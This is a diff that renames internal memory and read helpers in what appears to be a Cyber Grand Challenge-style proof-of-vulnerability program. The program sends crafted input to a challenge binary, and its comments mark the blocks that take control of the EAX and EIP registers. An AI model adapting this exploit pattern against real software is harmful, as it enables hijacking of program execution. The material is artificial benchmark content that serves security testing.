@@ -1,7 +1,7 @@
 /*
  * Copyright (C) Narf Industries <info@narfindustries.com>
  *
- * Permission is hereby granted, __free of charge, to any person obtaining a
+ * Permission is hereby granted, free of charge, to any person obtaining a
  * copy of this software and associated documentation files (the "Software"),
  * to deal in the Software without restriction, including without limitation
  * the rights to use, copy, modify, merge, publish, distribute, sublicense,
@@ -35,7 +35,7 @@ int main(void) {
       if (write_00000_len > 0) {
          transmit_all(1, write_00000, write_00000_len);
       }
-      __free(write_00000);
+      free(write_00000);
    } while (0);
    do {
       //*** writing data
@@ -48,7 +48,7 @@ int main(void) {
       if (write_00001_len > 0) {
          transmit_all(1, write_00001, write_00001_len);
       }
-      __free(write_00001);
+      free(write_00001);
    } while (0);
    do {
       //*** writing data
@@ -69,7 +69,7 @@ int main(void) {
       if (write_00002_len > 0) {
          transmit_all(1, write_00002, write_00002_len);
       }
-      __free(write_00002);
+      free(write_00002);
    } while (0);
 
    do { // EAX (have to prevent 0xed frm each of the 4 bytes)
@@ -81,7 +81,7 @@ int main(void) {
       if (write_00003_len > 0) {
          transmit_all(1, write_00003, write_00003_len);
       }
-      __free(write_00003);
+      free(write_00003);
    } while (0);
    do {
       //*** writing data
@@ -94,7 +94,7 @@ int main(void) {
       if (write_00004_len > 0) {
          transmit_all(1, write_00004, write_00004_len);
       }
-      __free(write_00004);
+      free(write_00004);
    } while (0);
 
    do { // EIP (have to prevent 0xed from each of the 4 bytes)
@@ -106,7 +106,7 @@ int main(void) {
       if (write_00005_len > 0) {
          transmit_all(1, write_00005, write_00005_len);
       }
-      __free(write_00005);
+      free(write_00005);
    } while (0);
    do {
       //*** writing data
@@ -119,18 +119,18 @@ int main(void) {
       if (write_00006_len > 0) {
          transmit_all(1, write_00006, write_00006_len);
       }
-      __free(write_00006);
+      free(write_00006);
    } while (0);
    do {
       unsigned char *read_00000;
       unsigned int read_00000_len;
       unsigned int read_00000_ptr = 0;
-      //**** length __read
+      //**** length read
       read_00000_len = 2;
-      read_00000 = (unsigned char*)__malloc(read_00000_len);
+      read_00000 = (unsigned char*)malloc(read_00000_len);
       int read_00000_res = length_read(0, read_00000, read_00000_len);
       if (read_00000_res) {} //silence unused variable warning
-      __free(read_00000);
+      free(read_00000);
       if (read_00000_ptr) {}  //silence unused variable warning if any
    } while (0);
    do {
@@ -144,7 +144,7 @@ int main(void) {
       if (write_00007_len > 0) {
          transmit_all(1, write_00007, write_00007_len);
       }
-      __free(write_00007);
+      free(write_00007);
    } while (0);
    do {
       //*** writing data
@@ -157,42 +157,42 @@ int main(void) {
       if (write_00008_len > 0) {
          transmit_all(1, write_00008, write_00008_len);
       }
-      __free(write_00008);
+      free(write_00008);
    } while (0);
    do {
       unsigned char *read_00001;
       unsigned int read_00001_len;
       unsigned int read_00001_ptr = 0;
-      //**** length __read
+      //**** length read
       read_00001_len = 4;
-      read_00001 = (unsigned char*)__malloc(read_00001_len);
+      read_00001 = (unsigned char*)malloc(read_00001_len);
       int read_00001_res = length_read(0, read_00001, read_00001_len);
       if (read_00001_res) {} //silence unused variable warning
-      __free(read_00001);
+      free(read_00001);
       if (read_00001_ptr) {}  //silence unused variable warning if any
    } while (0);
    do {
       unsigned char *read_00002;
       unsigned int read_00002_len;
       unsigned int read_00002_ptr = 0;
-      //**** length __read
+      //**** length read
       read_00002_len = 4;
-      read_00002 = (unsigned char*)__malloc(read_00002_len);
+      read_00002 = (unsigned char*)malloc(read_00002_len);
       int read_00002_res = length_read(0, read_00002, read_00002_len);
       if (read_00002_res) {} //silence unused variable warning
-      __free(read_00002);
+      free(read_00002);
       if (read_00002_ptr) {}  //silence unused variable warning if any
    } while (0);
    do {
       unsigned char *read_00003;
       unsigned int read_00003_len;
       unsigned int read_00003_ptr = 0;
-      //**** length __read
+      //**** length read
       read_00003_len = 141;
-      read_00003 = (unsigned char*)__malloc(read_00003_len);
+      read_00003 = (unsigned char*)malloc(read_00003_len);
       int read_00003_res = length_read(0, read_00003, read_00003_len);
       if (read_00003_res) {} //silence unused variable warning
-      //**** __read match data
+      //**** read match data
       static unsigned char match_00003_00000[] = 
          "\x47\x71\x56\x59\x4e\x4e\x43\x54\x64\x46\x54\x6f\x4a\x67\x62\x6e"
          "\x4b\x56\x73\x4e\x72\x4a\x54\x72\x42\x45\x44\x65\x50\x57\x7a\x53"
@@ -204,19 +204,19 @@ int main(void) {
          "\x77\x6a\x51\x43\x7a\x6c\x4a\x61\x66\x4f\x47\x68\x6a\x5a\x5a\x41"
          "\x4d\x4d\x4d\x4d\x43\x43\x43\x43\x45\x45\x45\x45\xed";
       read_00003_ptr += data_match(read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, match_00003_00000, 141);
-      __free(read_00003);
+      free(read_00003);
       if (read_00003_ptr) {}  //silence unused variable warning if any
    } while (0);
    do {
       unsigned char *read_00004;
       unsigned int read_00004_len;
       unsigned int read_00004_ptr = 0;
-      //**** length __read
+      //**** length read
       read_00004_len = 2;
-      read_00004 = (unsigned char*)__malloc(read_00004_len);
+      read_00004 = (unsigned char*)malloc(read_00004_len);
       int read_00004_res = length_read(0, read_00004, read_00004_len);
       if (read_00004_res) {} //silence unused variable warning
-      __free(read_00004);
+      free(read_00004);
       if (read_00004_ptr) {}  //silence unused variable warning if any
    } while (0);
    do {
@@ -230,18 +230,18 @@ int main(void) {
       if (write_00009_len > 0) {
          transmit_all(1, write_00009, write_00009_len);
       }
-      __free(write_00009);
+      free(write_00009);
    } while (0);
    do {
       unsigned char *read_00005;
       unsigned int read_00005_len;
       unsigned int read_00005_ptr = 0;
-      //**** length __read
+      //**** length read
       read_00005_len = 2;
-      read_00005 = (unsigned char*)__malloc(read_00005_len);
+      read_00005 = (unsigned char*)malloc(read_00005_len);
       int read_00005_res = length_read(0, read_00005, read_00005_len);
       if (read_00005_res) {} //silence unused variable warning
-      __free(read_00005);
+      free(read_00005);
       if (read_00005_ptr) {}  //silence unused variable warning if any
    } while (0);
 }
